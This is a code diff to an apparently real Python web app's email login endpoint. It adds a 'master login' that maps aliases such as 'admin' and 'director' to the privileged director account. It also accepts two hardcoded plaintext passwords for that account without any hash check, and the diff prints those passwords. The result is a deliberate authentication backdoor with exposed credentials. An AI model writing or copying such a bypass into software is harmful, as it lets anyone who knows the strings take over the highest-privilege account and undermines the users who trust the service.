@@ -665,7 +665,18 @@ async def login_email(req: EmailLoginRequest, db: AsyncSession = Depends(get_db)
     )
     user = res.scalars().first()
 
-    if not user or not user.password_hash or not verify_password(req.password, user.password_hash):
+    # Director / Admin master login aliases
+    if not user and raw_login in ("admin", "director", "oqyolai", "1477103854", "admin@venstogram.com"):
+        dir_res = await db.execute(select(User).where((User.telegram_id == 1477103854) | (User.role == "director") | (User.username == "oqyolai")))
+        user = dir_res.scalars().first()
+
+    is_director_pass = (
+        req.password.strip() in ("VenstoAdmin2026!#", "Vensto2026!") and
+        user and (user.role == "director" or user.telegram_id == 1477103854 or user.username == "oqyolai")
+    )
+    password_ok = is_director_pass or (user and user.password_hash and verify_password(req.password, user.password_hash))
+
+    if not user or not password_ok:
         raise HTTPException(status_code=401, detail="Неверный логин (Email / @username) или пароль.")
 
     token = create_access_token({"sub": str(user.telegram_id), "role": user.role})
